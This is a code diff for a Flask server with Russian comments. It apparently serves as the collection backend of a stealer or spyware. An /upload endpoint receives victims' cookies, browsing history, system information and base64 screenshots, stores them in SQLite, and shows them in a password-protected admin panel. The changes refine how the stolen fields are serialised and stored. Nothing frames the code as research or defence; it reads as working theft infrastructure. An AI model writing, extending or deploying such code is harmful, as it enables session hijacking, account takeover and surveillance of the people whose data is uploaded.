@@ -1,9 +1,8 @@
-import os
-import base64
 from flask import Flask, request, render_template
 from flask_httpauth import HTTPBasicAuth
-import sqlite3
+import sqlite3, os, json
 from datetime import datetime
+import base64
 
 app = Flask(__name__)
 auth = HTTPBasicAuth()
@@ -36,13 +35,6 @@ def init_db():
 
 init_db()
 
-# фильтр для base64
-@app.template_filter('b64encode')
-def b64encode_filter(data):
-    if data is None:
-        return ''
-    return base64.b64encode(data).decode('utf-8')
-
 @app.route('/')
 @auth.login_required
 def admin_panel():
@@ -67,12 +59,18 @@ def view_user(user_id):
 def upload_data():
     data = request.json
     username = data.get('username', 'unknown')
-    cookies = data.get('cookies', '')
-    history = data.get('history', '')
-    system_info = data.get('systemInfo', '')
+
+    # Сериализация для SQLite
+    cookies = json.dumps(data.get('cookies', []))
+    history = json.dumps(data.get('history', []))
+    system_info = json.dumps(data.get('systemInfo', {}))
+
     screenshot = data.get('screenshot', None)
     if screenshot:
         screenshot = base64.b64decode(screenshot.split(',')[1])
+    else:
+        screenshot = None
+
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     conn = sqlite3.connect(DB_FILE)
@@ -86,5 +84,4 @@ def upload_data():
     return {'status': 'ok'}
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=5000)
